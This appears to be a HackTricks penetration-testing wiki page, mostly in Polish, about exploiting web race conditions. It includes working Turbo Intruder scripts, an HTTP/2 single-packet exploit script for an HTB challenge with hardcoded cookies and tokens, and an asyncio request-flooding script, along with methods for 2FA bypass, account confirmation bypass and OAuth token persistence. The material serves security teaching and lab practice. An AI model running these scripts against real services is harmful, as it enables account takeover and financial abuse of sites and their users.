# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Aby uzyskać dogłębne zrozumienie tej techniki, sprawdź oryginalny raport pod adresem [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Ulepszanie ataków Race Condition

Główną przeszkodą w wykorzystaniu race condition jest zapewnienie, że wiele żądań jest obsługiwanych jednocześnie, z **bardzo małą różnicą w czasie ich przetwarzania — najlepiej poniżej 1ms**.

Poniżej znajdziesz kilka technik synchronizacji żądań:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Pozwala wysyłać dwa żądania przez jedno połączenie TCP, zmniejszając wpływ jittera sieciowego. Jednak ze względu na różnice po stronie serwera, dwa żądania mogą nie wystarczyć do stabilnego wykorzystania race condition.
- **HTTP/1.1 'Last-Byte Sync'**: Umożliwia wstępne wysłanie większości części 20–30 żądań, wstrzymując mały fragment, który następnie jest wysyłany razem, co pozwala na jednoczesne dotarcie do serwera.

**Przygotowanie do Last-Byte Sync** obejmuje:

1. Wysłanie nagłówków i danych body z pominięciem ostatniego bajtu bez zamykania strumienia.
2. Wstrzymanie na 100ms po wysłaniu początkowym.
3. Wyłączenie TCP_NODELAY, aby wykorzystać algorytm Nagle'a do grupowania ostatnich ramek.
4. Pingowanie, aby rozgrzać połączenie.

Późniejsze wysłanie wstrzymanych ramek powinno spowodować ich dotarcie w jednej paczce, co można zweryfikować przez Wireshark. Metoda ta nie ma zastosowania do plików statycznych, które zwykle nie biorą udziału w atakach RC.

### Dostosowywanie do architektury serwera

Zrozumienie architektury celu jest kluczowe. Serwery front-end mogą kierować żądania w różny sposób, co wpływa na timing. Wstępne rozgrzewanie połączeń po stronie serwera poprzez nieistotne żądania może ujednolicić czasy przetwarzania żądań.

#### Obsługa blokowania opartego na sesji

Frameworki takie jak PHP's session handler serializują żądania według sesji, co może ukrywać podatności. Użycie różnych tokenów sesji dla każdego żądania może obejść ten problem.

#### Pokonywanie limitów szybkości lub zasobów

Jeśli rozgrzewanie połączeń jest nieskuteczne, wywołanie opóźnień po stronie serwera poprzez zalew fałszywymi żądaniami może ułatwić single-packet attack, wywołując serwerowe opóźnienia sprzyjające race condition.

## Przykłady ataków

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Możesz wysłać żądanie do **Turbo Intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), możesz zmienić w żądaniu wartość, którą chcesz brute-force'ować dla **`%s`** jak w `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` a następnie wybrać **`examples/race-single-packer-attack.py`** z rozwijanego menu:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Jeśli zamierzasz wysyłać różne wartości, możesz zmodyfikować kod tym, który używa wordlisty ze schowka:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Jeśli serwis WWW nie obsługuje HTTP2 (tylko HTTP1.1), użyj `Engine.THREADED` lub `Engine.BURP` zamiast `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: W przypadku, gdy musisz wysłać żądanie do 1 endpointu, a następnie kilka do innych endpointów, aby wywołać RCE, możesz zmienić skrypt `race-single-packet-attack.py` na coś takiego:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Jest to także dostępne w **Repeater** przez nową opcję '**Send group in parallel**' w Burp Suite.
- Dla **limit-overrun** możesz po prostu dodać do grupy **to samo request 50 razy**.
- Dla **connection warming** możesz **dodać** na **początku** **grupy** kilka **requests** do niestatycznej części serwera WWW.
- Aby **opóźnić** proces **między** przetwarzaniem **jednego requesta i drugiego** w procesie z 2 substates, możesz **dodać dodatkowe requests pomiędzy** tymi żądaniami.
- Dla **multi-endpoint** RC możesz zacząć wysyłać **request**, który **przechodzi do ukrytego stanu**, a następnie **50 requests** zaraz po nim, które **wykorzystują ukryty stan**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Celem tego skryptu jest zmiana adresu email użytkownika przy jednoczesnym ciągłym sprawdzaniu, aż token weryfikacyjny nowego adresu dotrze na ostatni email (to dlatego, że w kodzie występował RC, w którym możliwe było zmodyfikowanie emaila, ale wysłanie weryfikacji na stary adres, ponieważ zmienna wskazująca email była już wypełniona pierwszym adresem).\
Gdy w odebranych wiadomościach znajduje się słowo "objetivo", wiemy, że otrzymaliśmy token weryfikacyjny zmienionego adresu i kończymy atak.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Ulepszanie Single Packet Attack

W oryginalnym badaniu wyjaśniono, że atak ma ograniczenie do 1,500 bajtów. Jednak w [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/) opisano, jak można rozszerzyć ograniczenie 1,500 bajtów single packet attack do **ograniczenia okna TCP 65,535 B poprzez użycie fragmentacji na warstwie IP** (podział pojedynczego pakietu na wiele pakietów IP) i wysyłanie ich w innej kolejności, co zapobiega ponownemu złożeniu pakietu, dopóki wszystkie fragmenty nie dotrą do serwera. Technika ta pozwoliła badaczowi wysłać 10,000 żądań w około 166 ms.

Zauważ, że chociaż to ulepszenie sprawia, że atak jest bardziej niezawodny w przypadku RC, które wymaga, aby setki/tysiące pakietów dotarły jednocześnie, może też mieć pewne ograniczenia programowe. Niektóre popularne serwery HTTP, takie jak Apache, Nginx i Go, mają restrykcyjne ustawienie `SETTINGS_MAX_CONCURRENT_STREAMS` na 100, 128 i 250. Jednak inne, takie jak NodeJS i nghttp2, mają je nieograniczone.\
To zasadniczo oznacza, że Apache będzie brać pod uwagę tylko 100 połączeń HTTP z jednego połączenia TCP (ograniczając ten atak RC).

Przykłady użycia tej techniki można znaleźć w repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Przed wcześniejszymi badaniami używano następujących payloadów, które po prostu próbowały wysyłać pakiety jak najszybciej, aby wywołać RC.

- **Repeater:** Check the examples from the previous section.
- **Intruder**: Wyślij **request** do **Intruder**, ustaw **number of threads** na **30** w **Options menu**, wybierz jako payload **Null payloads** i wygeneruj **30**.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Metodologia RC**

### Limit-overrun / TOCTOU

To najprostszy typ race condition, gdzie **vulnerabilities** pojawiają się w miejscach, które **ograniczają liczbę razy, w których możesz wykonać daną akcję**. Na przykład użycie tego samego kodu rabatowego w sklepie internetowym wielokrotnie. Bardzo prosty przykład można znaleźć w [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) lub w [**this bug**](https://hackerone.com/reports/759247)**.**

Istnieje wiele wariantów tego rodzaju ataku, w tym:

- Wykorzystanie karty podarunkowej wielokrotnie
- Ocena produktu wielokrotnie
- Wypłata lub przelanie środków przekraczających saldo konta
- Ponowne użycie jednego rozwiązania CAPTCHA
- Omijanie anti-brute-force rate limit

### **Ukryte podstany**

Wykorzystywanie złożonych race condition często polega na wykorzystaniu krótkich okien czasowych do interakcji z ukrytymi lub **niezamierzonymi podstanami maszyny**. Oto jak do tego podejść:

1. **Zidentyfikuj potencjalne ukryte podstany**
- Zacznij od zlokalizowania endpoints, które modyfikują lub wchodzą w interakcję z krytycznymi danymi, takimi jak profile użytkowników lub procesy resetowania hasła. Skup się na:
- **Storage**: Preferuj endpoints, które manipulują trwałymi danymi po stronie serwera zamiast tych, które obsługują dane po stronie klienta.
- **Action**: Szukaj operacji, które zmieniają istniejące dane — mają większe szanse stworzyć warunki podatne na exploit w porównaniu z tymi, które dodają nowe dane.
- **Keying**: Udane ataki zazwyczaj dotyczą operacji kluczowanych tym samym identyfikatorem, np. username lub reset token.
2. **Przeprowadź wstępne sondowanie**
- Testuj zidentyfikowane endpoints pod kątem race condition, obserwując odchylenia od oczekiwanych wyników. Nieoczekiwane odpowiedzi lub zmiany w zachowaniu aplikacji mogą wskazywać na podatność.
3. **Zademonstruj podatność**
- Zredukuj atak do minimalnej liczby żądań potrzebnych do wykorzystania podatności, często są to zaledwie dwa. Ten krok może wymagać wielu prób lub automatyzacji z powodu precyzyjnego timingu.

### Time Sensitive Attacks

Precyzja w timingu żądań może ujawnić podatności, szczególnie gdy do tokenów bezpieczeństwa używa się przewidywalnych metod jak timestamps. Na przykład generowanie password reset tokenów na podstawie timestamps może skutkować identycznymi tokenami dla równoczesnych żądań.

**Aby wykorzystać:**

- Użyj precyzyjnego timingu, np. ataku pojedynczym pakietem, by wysłać równoległe password reset requests. Identyczne tokeny wskazują na podatność.

**Przykład:**

- Zażądaj jednocześnie dwóch password reset tokens i porównaj je. Pasujące tokeny sugerują błąd w generowaniu tokenów.

**Sprawdź ten** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **aby to wypróbować.**

## Studia przypadków ukrytych podstanów

### Zapłać i dodaj przedmiot

Sprawdź ten [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) aby zobaczyć, jak **zapłacić** w sklepie i **dodać dodatkowy** przedmiot, za który **nie będziesz musiał zapłacić**.

### Potwierdź inne adresy email

Chodzi o to, by **zweryfikować adres email i jednocześnie zmienić go na inny**, aby sprawdzić, czy platforma weryfikuje nowo zmieniony adres.

### Zmień email na 2 adresy email (Cookie based)

Zgodnie z [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab był podatny na takeover w ten sposób, ponieważ mógł **wysłać** **email verification token jednego adresu email na inny adres email**.

**Sprawdź ten** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **aby to wypróbować.**

### Ukryte stany bazy danych / Ominięcie potwierdzenia

Jeśli **2 różne zapisy** są używane do **dodania** **informacji** w **database**, istnieje krótki okres, w którym **tylko pierwsze dane zostały zapisane** w database. Na przykład przy tworzeniu użytkownika **username** i **password** mogą zostać najpierw **zapisane**, a dopiero potem zapisany zostaje **token** do potwierdzenia nowo utworzonego konta. Oznacza to, że przez krótki czas **token do potwierdzenia konta jest null**.

W związku z tym **zarejestrowanie konta i wysłanie kilku żądań z pustym tokenem** (`token=` lub `token[]=` lub inną wariacją) w celu natychmiastowego potwierdzenia konta może pozwolić na **potwierdzenie konta**, którego nie kontrolujesz emaila.

**Sprawdź ten** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **aby to wypróbować.**

### Ominięcie 2FA

Poniższy pseudo-code jest podatny na race condition, ponieważ przez bardzo krótki czas **2FA nie jest egzekwowane**, podczas gdy session jest tworzona:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 wieczna persystencja

Istnieje kilka [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Te usługi pozwalają na utworzenie aplikacji i uwierzytelnienie użytkowników zarejestrowanych przez dostawcę. W tym celu **client** will need to **permit your application** to access some of their data inside of the **OAUth provider**.\
Do tego momentu to zwykłe logowanie przez google/linkedin/github... gdzie pojawia się strona z komunikatem: "_Application \<InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

The **problem** appears when you **accept it** and automatically sends an **`authorization_code`** to the malicious application. Then, this **application abuses a Race Condition in the OAUth service provider to generate more that one AT/RT** (_Authentication Token/Refresh Token_) from the **`authorization_code`** for your account. Basically, it will abuse the fact that you have accept the application to access your data to **create several accounts**. Then, if you **stop allowing the application to access your data one pair of AT/RT will be deleted, but the other ones will still be valid**.

#### Race Condition in `Refresh Token`

Once you have **obtained a valid RT** you could try to **abuse it to generate several AT/RT** and **even if the user cancels the permissions** for the malicious application to access his data, **several RTs will still be valid.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) you can find a PoC in Java to send websocket messages in **parallel** to abuse **Race Conditions also in Web Sockets**.
- With Burp’s WebSocket Turbo Intruder you can use the **THREADED** engine to spawn multiple WS connections and fire payloads in parallel. Start from the official example and tune `config()` (thread count) for concurrency; this is often more reliable than batching on a single connection when racing server‑side state across WS handlers. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
